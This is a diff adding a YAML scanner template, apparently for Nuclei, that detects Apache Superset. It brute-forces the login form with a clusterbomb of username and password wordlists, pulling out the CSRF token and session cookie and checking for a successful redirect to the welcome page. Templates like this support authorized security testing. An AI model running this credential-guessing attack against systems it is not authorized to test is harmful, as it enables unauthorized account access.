@@ -1,0 +1,81 @@
+id: apache-superset-login-extended
+
+info:
+  name: ApacheSuperset - Default Login
+  author: dordyan, gtrrnr
+  severity: high
+  description: ApacheSuperset contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://superset.apache.org/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 3120
+    shodan-query: http.title:Superset
+  tags: default-login,superset
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - "SUPERSET_WEBSERVER_TIMEOUT"
+
+  - raw:
+      - |
+        GET /login/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /login/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: session={{session}};
+
+        csrf_token={{csrf_token}}&username={{user}}&password={{password}}
+      - |
+        GET /superset/welcome/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session={{session}};
+
+    attack: clusterbomb
+    payloads:
+      user: github/dictionary/superset_login.txt
+      password: github/dictionary/superset_pass.txt
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'name="csrf_token" type="hidden" value="([0-9a-zA-Z\+\/\=\.\_\-]+)"'
+
+      - type: regex
+        name: session
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'session=([0-9a-zA-Z\.\-\_]+)'
+    req-condition: true
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 302
+          - status_code_3 == 200
+          - contains(body_3, 'firstName') && contains(body_3, 'Superset')
+        condition: and
